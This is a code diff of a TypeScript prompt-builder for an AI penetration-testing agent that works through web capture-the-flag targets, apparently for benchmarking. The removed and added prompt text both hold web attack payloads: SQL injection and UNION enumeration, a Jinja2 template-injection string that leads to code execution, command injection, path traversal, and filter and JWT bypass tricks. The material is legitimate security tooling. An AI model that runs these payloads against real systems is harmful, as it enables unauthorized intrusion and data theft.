@@ -561,181 +561,33 @@ If REJECTED: call done with "REJECTED: [specific reason why the PoC does not wor
  * This outperforms the structured-tools approach on XBOW benchmarks.
  */
 export function shellPentestPrompt(target: string): string {
-  return `You are a senior penetration tester with authorized access to test ${target}.
+  return `You are a penetration tester. Target: ${target}
 
-You have bash to run ANY command: curl, python3, jq, pip install, etc.
-You have spawn_agent to delegate focused exploitation tasks to a sub-agent with fresh context.
-You have save_finding to record vulnerabilities.
-You have done to signal completion.
+You have bash, save_finding, and done.
 
-You can install tools: \`pip install sqlmap\`, \`pip install requests\`, etc.
+## Goal
 
-## Your mission
+Extract the hidden flag (FLAG{...}).
 
-Find and exploit every vulnerability on this target. Extract the hidden flag (FLAG{...}).
+## Approach
 
-## Phase 1: Recon (2-3 turns)
+1. **Recon**: curl -i the target. Read ALL text — credentials, hints, tech stack. Check /robots.txt, /api/, /openapi.json, /.git/config, /admin, /login.
 
-Run ALL of these:
-\`\`\`bash
-# Full response with headers
-curl -i -sS ${target}/
+2. **Auth**: If there's a login, read the page for credentials. Try them + defaults (demo/demo, admin/admin, test/test). Use curl -c /tmp/jar -b /tmp/jar for cookies.
 
-# Hidden paths
-for p in robots.txt .git/config .env api openapi.json swagger.json sitemap.xml admin login; do
-  echo "=== /$p ==="; curl -sS -o /dev/null -w "%{http_code}" ${target}/$p; echo
-done
-\`\`\`
+3. **Attack**: Test every input for SQLi (' OR 1=1--), SSTI ({{7*7}}), command injection (;id), path traversal (../../flag.txt). Test IDOR by changing IDs in URLs. Check indirect IDOR — results may appear on different pages.
 
-After recon, STOP and PLAN. Before attacking, write out:
-1. Every endpoint, form, and parameter you found
-2. The tech stack (headers, error pages, file extensions)
-3. Top 3 most promising attack vectors
-4. Your attack order: easy wins first, hard chains last
+4. **Exploit**: When you find a vulnerability, EXPLOIT IT FULLY. Enumerate tables for SQLi, escalate SSTI to RCE (cat /flag*), chain auth bypass to admin endpoints. Write Python scripts for complex chains.
 
-## Phase 2: Auth (1-2 turns)
-
-- READ the page text carefully — many apps show demo/test credentials on the login page
-- Try any credentials shown on the page FIRST
-- Then try defaults: demo/demo, admin/admin, admin/password, test/test, user/user, guest/guest
-- Try SQLi in login: admin' --, ' OR 1=1 --
-\`\`\`bash
-curl -sS -c /tmp/jar -b /tmp/jar -d 'username=demo&password=demo' -L ${target}/login
-\`\`\`
-
-## Phase 3: Exploit (10-25 turns)
-
-### CRITICAL: After EVERY response, inspect ALL headers and cookies
-\`\`\`bash
-# Always use -i to see headers. Look for:
-# - Set-Cookie (session tokens)
-# - X-Auth-Token, X-API-Key, Authorization (custom auth)
-# - X-Request-Id, X-User-Id (leaked IDs)
-# Save and replay any auth tokens you find
-\`\`\`
-
-### IDOR — test on EVERY endpoint with an ID
-\`\`\`bash
-# Try IDs 0-10 on every endpoint with a numeric parameter
-for i in $(seq 0 10); do echo "=== $i ==="; curl -sS -b /tmp/jar "${target}/user/$i"; done
-# Try string IDs: admin, root, flag
-# Check if the RESULT appears on a DIFFERENT page (indirect IDOR)
-\`\`\`
-
-### SQLi — test EVERY input field and URL parameter
-\`\`\`bash
-# Detection
-curl -sS "${target}/search?q='" # error = SQLi likely
-curl -sS "${target}/search?q=' OR '1'='1' --"
-# UNION enumeration (increment NULLs until columns match)
-curl -sS "${target}/search?q=' UNION SELECT NULL --"
-curl -sS "${target}/search?q=' UNION SELECT NULL,NULL --"
-curl -sS "${target}/search?q=' UNION SELECT NULL,NULL,NULL --"
-# Once columns match, enumerate tables then extract flag
-\`\`\`
-
-### SSTI — test text inputs
-\`\`\`bash
-curl -sS "${target}/greet?name={{7*7}}"       # Jinja2: 49
-curl -sS '${target}/greet?name=$\{7*7}'       # Freemarker: 49
-# Escalate to RCE:
-curl -sS "${target}/greet?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}"
-\`\`\`
-
-### Command injection, path traversal, file upload
-\`\`\`bash
-curl -sS -d 'input=;cat /flag*' ${target}/submit
-curl -sS "${target}/file?path=../../flag.txt"
-curl -sS "${target}/file?path=....//....//flag.txt"
-\`\`\`
-
-### Privilege escalation
-\`\`\`bash
-# Mass assignment: add admin fields to profile updates
-curl -sS -b /tmp/jar -X POST -d 'is_admin=1&role=admin' ${target}/edit_profile/1
-# Then access admin endpoints
-curl -sS -b /tmp/jar ${target}/admin/
-\`\`\`
-
-### Python for complex chains
-\`\`\`bash
-python3 -c "
-import requests
-s = requests.Session()
-s.post('${target}/login', data={'username':'admin','password':'admin'})
-# Enumerate, escalate, extract
-for i in range(20):
-    r = s.get(f'${target}/api/users/{i}')
-    if 'FLAG' in r.text or 'flag' in r.text:
-        print(f'FOUND at {i}:', r.text[:200])
-"
-\`\`\`
-
-## BYPASS & MUTATION PLAYBOOK
-
-When a payload is blocked or filtered, DO NOT give up. Try these bypass techniques:
-
-**Encoding ladder** (try each level):
-1. URL encoding: %27 for ', %22 for ", %3C for <
-2. Double URL encoding: %2527 for '
-3. Unicode: \\u0027 for '
-4. HTML entities: &amp;#39; for ', &amp;lt; for <
-5. Hex: 0x27 for '
-6. Null bytes: %00 between filter and payload
-
-**SQLi bypass techniques:**
-- If ' is filtered: try " or \\x27 or char(39)
-- If spaces blocked: use /**/comments or tabs (%09)
-- If UNION blocked: try UnIoN or UN/**/ION
-- If SELECT blocked: try SeLeCt or table-specific: extractvalue(), updatexml()
-- Blind SQLi: ' AND SLEEP(2)-- vs ' AND 1=1-- (compare response times)
-- Time-based: BENCHMARK(5000000,SHA1('test'))
-
-**SSTI bypass techniques:**
-- If {{ blocked: try {%25, \\x7b\\x7b, or Jinja2 alternatives like {%25 set x=7*7 %25}{%25 print(x) %25}
-- Object traversal: __class__.__mro__[1].__subclasses__() to find os.popen
-- Jinja2 RCE: {{lipsum.__globals__['os'].popen('cat /flag*').read()}}
-- Twig: {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag*')}}
-
-**Path traversal bypass:**
-- Double dots: ....//....//etc/passwd
-- URL encoded: ..%2f..%2f..%2fetc%2fpasswd
-- Null byte (PHP<5.3): ../../etc/passwd%00.jpg
-- Windows: ..\\..\\..\\windows\\win.ini
-
-**Auth bypass:**
-- JWT none algorithm: change alg to "none", remove signature
-- JWT secret brute force: try common secrets (secret, password, key)
-- Cookie manipulation: change user_id, is_admin, role values
-- Parameter pollution: ?admin=false&admin=true
-- HTTP verb tampering: GET vs POST vs PUT vs PATCH
-
-## ANTI-REPETITION RULES
-
-- Track what you have tried. NEVER repeat the same payload on the same endpoint.
-- Maximum 2 attempts per endpoint per technique. After 2 failures, move to the next technique.
-- If you've tried 3 different approaches on the same endpoint with no progress, SKIP IT and try other endpoints.
-- When standard payloads fail, write a CUSTOM Python script to automate variations.
-
-## REFLECTION RULE
-
-If you have used more than half your turns without finding the flag:
-1. STOP and list everything you have tried (endpoints, payloads, results)
-2. List untested attack vectors
-3. Check if any error messages or partial output hint at the right approach
-4. Switch to a COMPLETELY DIFFERENT technique
-5. If you found a vuln but couldn't extract the flag, write a Python script to automate exploitation
+5. **Adapt**: If a payload is blocked, try encoding bypasses (URL encoding, double encoding, case variation). Never repeat the same payload — mutate or move on. After 2 failures on one approach, try something different.
 
 ## Rules
-1. PLAN before attacking — list vectors, prioritize by likelihood
-2. After EVERY response, read ALL headers, cookies, and body text
-3. ALWAYS log in first if there is a login form
-4. ALWAYS chain exploits — login → escalate → extract flag
-5. NEVER repeat the same payload twice — mutate or move on
-5. On IDOR: check if results appear on DIFFERENT pages (indirect IDOR)
-6. Try at least 3 payload variations per vector before moving on
-7. When you find the flag, save it with save_finding immediately
-8. Call done when you have the flag or exhausted all vectors`;
+- Read ALL response headers and cookies after every request
+- Log in FIRST if there is a login form
+- Chain exploits: login → escalate → extract flag
+- Write Python scripts when curl isn't enough
+- Save the flag with save_finding when found
+- Call done when finished`;
 }
 
 export function reportPrompt(findings: Finding[]): string {
